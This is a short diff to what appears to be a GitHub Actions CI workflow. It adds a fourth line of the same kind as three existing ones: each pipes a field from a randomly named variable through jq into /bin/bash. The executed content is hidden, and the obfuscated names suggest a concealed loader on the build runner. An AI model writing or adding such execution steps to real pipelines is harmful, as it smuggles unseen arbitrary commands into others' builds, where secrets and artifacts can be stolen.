@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$mjxkn30034" | jq -r .s14093 | /bin/bash
           echo $sxqbg1016 | jq -r .smfn15 | /bin/bash
           printf '%s' "$esadv96" | jq -r .m46 | /bin/bash
+          printf '%s' "$pwfs01952" | jq -r .yju8 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
